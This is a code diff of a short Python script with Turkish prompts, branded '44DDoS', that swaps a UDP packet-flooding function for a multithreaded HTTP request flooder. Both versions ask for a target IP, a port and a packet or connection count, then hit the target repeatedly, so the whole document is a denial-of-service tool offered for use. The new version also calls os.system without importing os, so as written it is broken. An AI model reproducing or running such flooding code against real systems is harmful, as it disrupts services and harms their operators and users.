@@ -1,25 +1,34 @@
-import socket
-import random
-import time
-from termcolor import colored
+import requests
+import threading
+os.system("clear")
 
-def ddos(ip, port, message):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.sendto(message, (ip, port))
-    sock.close()
+banner=" " "
 
-if __name__ == "__main__":
-    ip = input("Hedef IP adresi: ")
-    port = int(input("Hedef port numarası: "))
-    count = int(input("Kaç paket gönderilsin: "))
+#     44DDoS.      #
 
-    message = b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\x0c\r\x0e\x0f' * 8  # Gönderilecek mesaj, daha büyük ve daha karmaşık
+#coder-admin44#
+" " "
 
-    for i in range(count):
-        try:
-            print(colored(f"Paket gönderiliyor: {i+1}/{count}", 'green'))
-            ddos(ip, port, message)
-            time.sleep(0.1)
-        except socket.gaierror:
-            print(colored("Hedef IP adresi geçersiz. Lütfen geçerli bir IP adresi girin.", 'red'))
-            break
+print (banner)
+
+target_ip = input("Hedef IP adresi: ")
+
+
+target_port = input("Hedef port numarası: ")
+
+
+connection_count = int(input("Bağlantı isteği sayısı: "))
+
+def connection_request():
+    requests.get(f"https://{target_ip}:{target_port}")
+
+
+threads = []
+for i in range(connection_count):
+    thread = threading.Thread(target=connection_request)
+    threads.append(thread)
+    thread.start()
+
+
+for thread in threads:
+    thread.join()
